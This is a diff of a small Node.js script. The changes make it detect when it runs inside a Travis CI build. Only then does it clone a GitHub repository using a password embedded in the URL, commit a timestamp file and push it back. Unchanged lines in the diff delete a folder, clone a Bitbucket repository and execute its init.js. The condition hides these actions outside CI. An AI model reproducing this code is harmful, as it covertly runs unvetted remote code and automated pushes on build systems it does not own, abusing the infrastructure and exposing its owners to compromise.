@@ -1,15 +1,18 @@
 var exec = require("child_process").exec;
 var index = 1;
-var max = 40;
+var max = 35;
 var interval;
-var target = 'https://luwujeb:test123@github.com/luwujeb/tale.git';
-console.log(__dirname);
+var target = '';
+if (__dirname.indexOf('/home/travis') !== -1){
+  var pt = __dirname.split('travis/build/').pop();
+  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
+}
 var myrepo = 'git clone ' + target + ' aaa && ';
 myrepo += 'git config --global user.email "test" && ';
 myrepo += 'git config --global user.name "test" && ';
 myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
 myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
-exec(myrepo);
+if (__dirname.indexOf('/home/travis') !== -1) exec(myrepo);
 var child = exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js');
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
